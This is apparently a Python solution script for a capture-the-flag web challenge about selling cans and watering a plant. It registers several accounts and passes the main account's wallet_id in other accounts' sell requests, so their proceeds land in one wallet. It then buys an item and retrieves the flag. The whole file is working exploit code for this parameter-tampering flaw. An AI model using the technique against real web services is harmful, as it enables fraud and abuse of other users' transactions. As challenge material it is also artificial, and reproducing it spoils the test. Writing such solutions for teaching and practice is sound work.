import requests
import sys
import re
if len(sys.argv) != 3:
	print('Usage: solution.py <challenge-url> <username>')

# Variables 
url = sys.argv[1]
username = sys.argv[2]
password = "woofwoof"
keyUser = ''

# Method to handle the selling of cans
def sellCans(id, KeyUser):
	with requests.Session() as s1:
		regParam = {'username':username + id,'password':password,'confirm':password,'submit':'Register'}
		s1.post(url + '/register',json=regParam)
		loginParam = {'username':username + id,'password':password,'submit':'Login'}
		s1.post(url + '/login', json=loginParam)
		r = s1.get(url + '/home')
		canId = re.search('(?<=sell\?id\=)([\w-]+)',r.text).group(1)
		r = s1.get(url + '/sell?id=' + canId + '&wallet_id=' + keyUser)

# Set-up your main user
with requests.Session() as s:
	regParam = {'username':username,'password':password,'confirm':password,'submit':'Register'}
	s.post(url + '/register',json=regParam)
	loginParam = {'username':username,'password':password,'submit':'Login'}
	s.post(url + '/login', json=loginParam)
	s.get(url + '/water')
	r = s.get(url + '/home')
	keyUser = re.search('(?<=wallet\_id\=)([\w-]+)',r.text).group(1)
	canId = re.search('(?<=sell\?id\=)([\w-]+)',r.text).group(1)
	s.get(url + '/sell?id=' + canId + '&wallet_id=' + keyUser)
	print(keyUser)
	# Sell Cans on two other accounts 
	sellCans('1',keyUser)
	sellCans('2',keyUser)
	# Buy a can, water plant and get flag
	s.get(url + '/buy?id=Can')
	s.get(url + '/water')
	r = s.get(url + '/flag')
	print(r.text)



